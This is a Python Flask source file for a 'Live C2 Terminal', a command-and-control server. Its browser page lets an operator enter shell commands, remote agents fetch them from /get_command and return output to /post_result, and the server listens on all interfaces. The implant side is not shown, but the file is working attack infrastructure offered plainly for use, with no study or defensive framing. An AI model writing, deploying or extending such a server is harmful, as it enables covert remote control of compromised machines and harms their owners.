from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

state = {
    "command": None,
    "result": None,
    "acknowledged": False,
}

@app.route('/')
def index():
    return render_template_string('''
        <html>
        <head>
            <title>Live C2 Terminal</title>
            <style>
                body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
                input[type=text] { background: #222; color: #0f0; border: none; padding: 5px; width: 500px; }
                pre { white-space: pre-wrap; word-wrap: break-word; }
            </style>
        </head>
        <body>
            <h2>Agent Terminal</h2>
            <div id="terminal">
                <div>> <input id="cmdInput" type="text" autofocus placeholder="Enter command and press Enter"></div>
                <pre id="output"></pre>
            </div>

            <script>
                const cmdInput = document.getElementById('cmdInput');
                const output = document.getElementById('output');

                cmdInput.addEventListener('keydown', async (e) => {
                    if (e.key === 'Enter') {
                        const command = cmdInput.value.trim();
                        if (!command) return;

                        output.innerHTML += "> " + command + "\\n";
                        cmdInput.value = "";

                        // Send command
                        await fetch('/set_command', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ command })
                        });

                        // Wait for agent result
                        let result = "";
                        for (let i = 0; i < 20; i++) {  // retry 20x with 500ms delay
                            const res = await fetch('/get_result');
                            const text = await res.text();
                            if (text !== "pending") {
                                result = text;
                                break;
                            }
                            await new Promise(r => setTimeout(r, 500));
                        }

                        output.innerHTML += result + "\\n";
                        output.scrollTop = output.scrollHeight;
                    }
                });
            </script>
        </body>
        </html>
    ''')

@app.route('/set_command', methods=['POST'])
def set_command():
    data = request.get_json()
    state["command"] = data.get("command")
    state["result"] = None
    state["acknowledged"] = False
    print(f"[SET] Command set: {state['command']}")
    return '', 204

@app.route('/get_command', methods=['GET'])
def get_command():
    if not state["acknowledged"] and state["command"]:
        print(f"[GET] Agent pulled command: {state['command']}")
        return state["command"]
    return "none"

@app.route('/post_result', methods=['POST'])
def post_result():
    data = request.get_json()
    result = data.get('result', '').strip()
    if result:
        state["result"] = result
        state["acknowledged"] = True
        state["command"] = None
        print(f"[POST] Result received:\n{result}")
    return '', 204

@app.route('/get_result', methods=['GET'])
def get_result():
    if state["acknowledged"] and state["result"]:
        return state["result"]
    return "pending"

if __name__ == '__main__':
    print("[*] Flask live terminal server running...")
    app.run(host='0.0.0.0', port=5001)
